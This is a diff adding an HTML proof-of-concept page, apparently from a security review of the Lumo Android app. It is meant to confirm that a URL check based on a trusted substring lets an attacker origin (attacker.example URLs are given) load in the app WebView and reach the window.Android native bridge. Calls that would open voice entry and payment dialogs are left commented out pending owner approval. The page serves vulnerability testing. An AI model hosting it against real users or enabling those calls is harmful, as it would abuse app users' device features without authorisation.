@@ -1,0 +1,27 @@
+<!-- Attacker page for candidate A-1 live confirmation step (PENDING, not executed in this task).
+     Host this file at an attacker origin whose URL contains the trusted substring,
+     for example https://lumo.proton.me.attacker.example/ or https://attacker.example/lumo.proton.me
+     Then, inside the Lumo Android app, tap a chat link pointing to that URL.
+     Expected vulnerable behavior: page loads INSIDE the app WebView (no external browser,
+     no visible URL bar) and the calls below reach native code.
+     Expected fixed behavior: page opens in the external browser; window.Android is undefined. -->
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Lumo A-1 test page</title></head>
+<body>
+<h1>Lumo A-1 test page (not Proton, no sign-in)</h1>
+<p id="status">checking bridge...</p>
+<script>
+  var s = document.getElementById('status');
+  if (typeof window.Android !== 'undefined') {
+    s.textContent = 'BRIDGE EXPOSED: window.Android is available on this attacker origin';
+    // Harmless probes only. Do not enable the lines below without owner approval:
+    // window.Android.log('A-1 probe from attacker origin');
+    // window.Android.startVoiceEntry();  // opens native speech sheet / mic permission flow
+    // window.Android.showPayment();      // opens native payment dialog
+  } else {
+    s.textContent = 'bridge not available (fixed or external browser)';
+  }
+</script>
+</body>
+</html>
